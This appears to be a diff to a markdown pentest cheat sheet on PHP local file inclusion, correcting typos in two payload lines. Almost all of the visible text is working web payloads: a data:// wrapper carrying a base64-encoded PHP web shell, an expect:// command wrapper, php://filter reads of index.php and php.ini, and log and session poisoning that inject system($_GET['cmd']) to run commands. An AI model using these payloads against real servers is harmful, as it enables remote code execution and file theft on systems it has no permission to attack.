@@ -700,7 +700,7 @@ $language = str_replace('../', '', $_GET['file']);
 
 ```
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id  
-expect://id`  
+expect://id  
 php://filter/read=convert.base64-encode/resource=index.php  
 php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
 ```
@@ -764,7 +764,7 @@ http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
 
 -> PHP session
 
-`http://ip/index.php?file=<?php system($_GET["cmd"];?>`  
+`http://ip/index.php?file=<?php system($_GET["cmd"]);?>`  
 `http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`  
   
 -> Other Paths  
